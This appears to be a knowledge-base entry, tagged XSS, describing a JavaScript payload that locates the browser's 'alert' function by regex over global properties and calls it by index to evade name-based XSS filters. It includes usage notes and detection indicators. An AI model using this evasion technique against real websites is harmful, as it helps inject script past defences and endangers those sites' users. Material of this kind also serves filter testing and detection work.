---
id: 4c465e9e-b4bf-4e76-ab2f-2f9e6e5dd108
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768379+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - regex
  - binding
platforms:
  - Web
  - Browser
validated: true
---

# Bind-Alert-Function-to-Custom-Function-Using-Regex

## Code

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()

// then you can use a() with Object.keys

self[Object.keys(self)[a()]]("1") // alert("1")
```

## Description

Defines a function 'a()' that uses regex to find and return the index of 'alert'-like names, then binds and executes it via global index access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "1" | Argument to the bound alert function | "1" |

## Usage

Execute the definition first, then the invocation. Bypasses name-based filters with pattern matching.

## Detection

- Regex tests on global properties (/^a[rel]+t$/).
- Function redefinition or binding in dynamic scripts.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
